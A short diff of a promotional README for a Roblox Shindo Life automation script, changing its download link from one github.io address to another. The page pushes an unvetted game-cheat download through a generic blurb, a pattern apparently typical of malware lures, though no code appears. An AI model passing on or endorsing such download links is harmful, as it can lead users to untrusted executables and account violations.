@@ -2,7 +2,7 @@
 
 Discover a powerful and user-friendly script assistant tailored for Roblox Shindo Life. This tool automates repetitive gameplay tasks, enabling faster progression and smoother in-game experience. Perfect for players seeking to maximize efficiency and enjoy their Shindo Life journey without hassle.
 
-[![Download Shindo Life Script](https://img.shields.io/badge/Download-Shindo_Life_Script-blueviolet)](https://shindo-life-script.github.io/.github)
+[![Download Shindo Life Script](https://img.shields.io/badge/Download-Shindo_Life_Script-blueviolet)](https://shindolife-downloadscript.github.io/.github/)
 
 ---
 
